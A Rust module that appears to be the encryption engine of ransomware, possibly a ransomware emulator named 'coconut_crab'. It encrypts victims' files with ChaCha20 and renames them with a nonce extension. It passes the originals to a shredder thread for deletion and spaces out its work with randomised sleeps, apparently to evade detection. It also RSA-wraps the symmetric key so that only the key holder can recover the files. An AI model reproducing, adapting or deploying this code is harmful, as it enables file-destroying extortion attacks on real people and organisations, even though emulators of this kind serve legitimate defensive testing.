use std::{
    fs::{self, File, OpenOptions},
    io::{Read, Write, Error},
    path::PathBuf,
    sync::{Arc, Mutex},
    thread,
    time
};    
use chacha20::{
    cipher::{KeyIvInit, StreamCipher, StreamCipherSeek},
    ChaCha20
};
use hex::{encode, decode, FromHex};
use crossbeam_channel::{Sender, Receiver};
use rand::{Rng, SeedableRng, rngs::{SmallRng, ThreadRng, StdRng}};
use log::{debug, error, info, warn};
use rsa::{Pkcs1v15Encrypt, RsaPublicKey};

use coconut_crab_lib::file::get_file_data;

const MAX_IN_MEMORY_CHACHA_SIZE_MB: u64 = 10;
const BUFFER_LEN: usize = 100 * 1024;
const ANALYSIS_FILENAME: &str = "analysis.txt";

pub fn encrypt(r: Receiver<Arc<PathBuf>>,s: Sender<Arc<PathBuf>>, key: Arc<[u8; 32]>, nonce_mutex: Arc<Mutex<[u8; 12]>>, encrypted_extension: Arc<String>, wait_time: Arc<u32>, jitter_time: Arc<u32>) -> thread::JoinHandle<()> {
    debug!("Starting encryption crypto thread");
    thread::spawn(move || {
        let mut rng_cheap = match SmallRng::from_rng(ThreadRng::default()) {
            Ok(rng_cheap_result) => {
                debug!("Succcessfully created cheap random number generator");
                rng_cheap_result
            },
            Err(rng_cheap_result) => {
                error!("Failed to create cheap random number generator: {}", rng_cheap_result);
                return
            },
        };
        loop {
            let file_path = match r.recv() {
                Ok(file_path_result) => {
                    debug!("Received file path over channel: {:?}", file_path_result);
                    file_path_result
                },
                Err(file_path_result) => {
                    warn!("Error receiving file path over channel: {}", file_path_result);
                    return
                },
            };

            info!("Encrypting file: {:?}", file_path);

            let nonce;
            {
                let mut nonce_guard = nonce_mutex.lock().expect("Mutex was poisoned");
                nonce = nonce_guard.clone();
                debug!("Initial nonce: {:?}", nonce);
                increment_nonce(&mut *nonce_guard);
                debug!("Incremented nonce: {:?}", nonce);
            }
            let nonce_file_extension = format!("{}.{}", encode(&nonce), encrypted_extension);
            debug!("Nonce extension: {}", nonce_file_extension);

            let mut encrypted_file_path = file_path.as_ref().clone();
        
            if let Some(original_extension) = file_path.as_ref().extension() {
                debug!("File has original extension: {:?}", original_extension);
                encrypted_file_path.set_extension(format!("{}.{}", original_extension.to_string_lossy(), nonce_file_extension));
            } else {
                debug!("File does not have original extension: {:?}", file_path);
                encrypted_file_path.set_extension(&nonce_file_extension);
            }
            debug!("Encrypted file path: {:?}", encrypted_file_path);
        
            debug!("Applying chacha20 with source {:?}, destination {:?}, and nonce {:?} ", file_path.as_ref(), encrypted_file_path, nonce);
            match apply_chacha(file_path.as_ref(),&encrypted_file_path, &key, &nonce) {
                Ok(_) => {
                    debug!("Successfully applied ChaCha to data for encryption: {:?}", file_path);
                    match s.send(file_path.clone()) {
                        Ok(_) => {
                            debug!("Successfully sent path to shredder thread: {:?}", file_path);
                        },
                        Err(send_result) => {
                            error!("Failed to send path to shredder thread: {}", send_result);
                        }
                    }
                },
                Err(apply_chacha_result) => {
                    error!("Failed to apply ChaCha to data for encryption: {:?}", apply_chacha_result);
                }
            }

            if *wait_time > 0 {
                let time = *wait_time - *jitter_time + rng_cheap.gen_range(0..*jitter_time);
                debug!("Sleeping {} seconds before next encryption", time);
                let time_duration = time::Duration::from_secs(time as u64);
                thread::sleep(time_duration);
                debug!("Sleeping complete");
            }
        }
    })
}

pub fn record(r: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let analysis_file_path = path.join(ANALYSIS_FILENAME);
        let mut analysis_file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(&analysis_file_path)
        .expect("Cannot open file");

        loop {
            let file_path = match r.recv() {
                Ok(file_path_result) => {
                    debug!("Received file path over channel: {:?}", file_path_result);
                    file_path_result
                },
                Err(file_path_result) => {
                    warn!("Error receiving file path over channel: {}", file_path_result);
                    return;
                },
            };
    
            analysis_file
            .write_all(format!("{}\n", file_path.to_string_lossy()).as_bytes())
            .expect("Failed to write to file");
        }
    })
}

pub fn decrypt(r: Receiver<Arc<PathBuf>>, key: Arc<[u8; 32]>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        loop {
            let file_path = match r.recv() {
                Ok(file_path_result) => {
                    debug!("Received file path over channel: {:?}", file_path_result);
                    file_path_result
                },
                Err(file_path_result) => {
                    warn!("Error receiving file path over channel: {}", file_path_result);
                    return
                },
            };

            info!("Decrypting file: {}", file_path.display());

            let file_name_osstr = match file_path.file_name() {
                Some(file_name_osstr_result) => {
                    debug!("Successfully got file name from path: {:?}", file_name_osstr_result);
                    file_name_osstr_result
                },
                None => {
                    error!("File path has invalid file name: {:?}", file_path);
                    return
                },
            };
        
            let file_name = match  file_name_osstr.to_str() {
                Some(file_name_result) => {
                    debug!("Successfully converted file name to string: {}", file_name_result);
                    file_name_result
                },
                None => {
                    error!("File name is not valid UTF-8: {:?}", file_name_osstr);
                    return
                },
            };
                
            let file_extensions: Vec<&str> = file_name.split('.').collect();
            let file_extensions_count = file_extensions.len();        
            if file_extensions_count < 2 {
                error!("File lacks the number of extensions to decrypt: {}", file_extensions_count);
                return;
            }
                    
            let nonce_str = match file_extensions.get(file_extensions_count - 2) {
                Some(nonce_str_result) => {
                    debug!("Successfuly got nonce file extension: {}", nonce_str_result);
                    nonce_str_result
                },
                None => {
                    error!("Cannot get nonce extension: {:?}", file_extensions);
                    return
                }
            };
        
            let nonce = match <[u8; 12]>::from_hex(nonce_str) {
                Ok(nonce_result) => {
                    debug!("Extension hex decoded: {:?}", nonce_result);
                    nonce_result
                },
                Err(nonce_result) => {
                    error!("Extension hex could not be decoded: {:?}", nonce_result);
                    return
                },
            };        
                                    
            let parent_dir = match file_path.parent() {
                Some(parent_dir_result) => {
                    debug!("Successfully got parent path of file path: {:?}", file_path);
                    parent_dir_result
                },
                None => { 
                    error!("File path has invalid parent path: {:?}", file_path);
                    return
                },
            };
        
            let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
            debug!("Decrypted file name: {}", decrypted_file_name);
            let decrypted_file_path = parent_dir.join(decrypted_file_name);
            debug!("Decrypted file path: {:?}", decrypted_file_path);
        
            match apply_chacha(file_path.as_ref(),&decrypted_file_path, &key, &nonce) {
                Ok(_) => {
                    debug!("Successfully applied ChaCha to data for decryption: {:?}", file_path);
                },
                Err(apply_chacha_result) => {
                    error!("Failed to apply ChaCha to data for decryption: {:?}", apply_chacha_result);
                }
            }
        }
    })
}

fn apply_chacha(source_file_path: &PathBuf, destination_file_path: &PathBuf, key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Error> {
    let mut cipher = ChaCha20::new(key.into(), nonce.into());
    
    let source_file_data = match get_file_data(source_file_path, &(MAX_IN_MEMORY_CHACHA_SIZE_MB * 1024 * 1024)) {
        Ok(source_file_result) => {
            debug!("No error during file data retrieval {:?}", source_file_path);
            source_file_result
        },
        Err(source_file_result) => {
            error!("Error during file data retrieval: {:?}", source_file_result);
            return Err(source_file_result)
        }
    };
    
    if let Some(mut some_source_file_data) = source_file_data {
        debug!("File size is below threshold. Performing encryption with entire file in memory.");
        cipher.apply_keystream(&mut *some_source_file_data);

        match fs::write(destination_file_path, &some_source_file_data){
            Ok(_) => {
                debug!("Successfuly wrote to file: {:?}", destination_file_path);
                return Ok(())
            },
            Err(destination_write_result) => {
                error!("Error writing to file: {:?}", destination_write_result);
                return Err(destination_write_result)
            }
        }
    } else {
        debug!("File size is above threshold. Performing encryption using buffer.");
        let mut buffer = [0u8; BUFFER_LEN];
        let mut bytes_read: u64 = 0;
    
        let mut source_file = match File::open(source_file_path) {
            Ok(source_file_result) => {
                debug!("Successfuly opened source file: {:?}", source_file_path);
                source_file_result
            },
            Err(source_file_result) => {
                error!("Error opening source file: {:?}", source_file_result);
                return Err(source_file_result)
            },
        };

        let mut destination_file_data = match File::create(destination_file_path) {
            Ok(destination_file_data_result) => {
                debug!("Successfully created destination file: {:?}", destination_file_path);
                destination_file_data_result
            },
            Err(destination_file_data_result) => {
                error!("Error creating destination file: {:?}", destination_file_data_result);
                return Err(destination_file_data_result)
            },
        };

        loop {
            let read_size = match source_file.read(&mut buffer) {
                Ok(read_size_result) => {
                    debug!("Read {} bytes to buffer", read_size_result);
                    read_size_result
                },
                Err(read_size_result) => {
                    error!("Error reading file to buffer: {:?}", read_size_result);
                    return Err(read_size_result)
                },
            };

            if read_size == 0 {
                debug!("All bytes read from source file to buffer");
                break;
            }

            cipher.seek(bytes_read);
            cipher.apply_keystream(&mut buffer);
            bytes_read += BUFFER_LEN as u64;
            debug!("{} total bytes read and encrypted", bytes_read);
            match destination_file_data.write_all(&buffer) {
                Ok(_) => {
                    debug!("Successfuly wrote bytes to file: {:?}", destination_file_path);
                },
                Err(destination_write_result) => {
                    error!("Error writing buffer to file: {:?}", destination_write_result);
                    return Err(destination_write_result)
                }
            }
        }
        return Ok(())
    }         
}

fn increment_nonce(nonce: &mut [u8; 12]) {
    let mut carry = 1;
    let mut sum;
    for elem in nonce.iter_mut().rev() {
        sum = *elem as u16 + carry;
        *elem = (sum % 256) as u8;
        carry = sum / 256;
    }
    debug!("Nonce incremented to {:?}", nonce);
}

pub fn encrypt_string(source: &str,  key: &[u8; 32], nonce: &mut [u8; 12]) -> String {
    let mut cipher = ChaCha20::new(key.into(), (&*nonce).into());
    debug!("Encrypting string: {}", source);
    let mut source_data = source.as_bytes().to_vec();
    debug!("String bytes: {:?}", source_data);
    cipher.apply_keystream(&mut *source_data);
    debug!("String encrypted: {:?}", encode(&source_data));
    increment_nonce(nonce);
    encode(source_data)
}

pub fn decrypt_string(source_str: &str,  key: &[u8; 32], nonce_str: &str) -> String {
    let mut source_data = match decode(source_str) {
        Ok(source_data_result) => {
            debug!("Successfully decoded hex encrypted string: {:?}", source_data_result);
            source_data_result
        },
        Err(source_data_result) => {
            error!("Unable to decode hex encrypted string: {}", source_data_result);
            return String::new()
        }
    };
    let nonce_data = match <[u8; 12]>::from_hex(nonce_str) {
        Ok(nonce_data_result) => {
            debug!("Successfully decoded hex nonce: {:?}", nonce_data_result);
            nonce_data_result
        },
        Err(nonce_data_result) => {
            error!("Unable to decode hex nonce: {}", nonce_data_result);
            return String::new()
        }
    };
    let mut cipher = ChaCha20::new(key.into(), &nonce_data.into());   
    debug!("Decrypting to string: {:?}", source_data);
    cipher.apply_keystream(&mut *source_data);
    debug!("String bytes: {:?}", source_data);
    return match String::from_utf8(source_data) {
        Ok(bytes_string_result) => {
            debug!("Successfully decoded bytes to string: {}", bytes_string_result);
            bytes_string_result
        },
        Err(bytes_string_result) => {
            error!("Failed to decode bytes to string: {}", bytes_string_result);
            String::new()
        }
    };
}

pub fn generate_sym_key(sym_key: &mut [u8; 32]) {
    debug!("Starting key generation");
    let mut rng = StdRng::from_entropy();
    rng.fill(sym_key);
    debug!("Generated symmetric key");
}

pub fn encrypt_sym_key(asym_pub_key: &RsaPublicKey, sym_key: &[u8; 32]) -> String {
    let mut rng = ThreadRng::default();
    encode(asym_pub_key.encrypt(&mut rng, Pkcs1v15Encrypt, sym_key).expect("Failed to encrypt symmetric key"))
}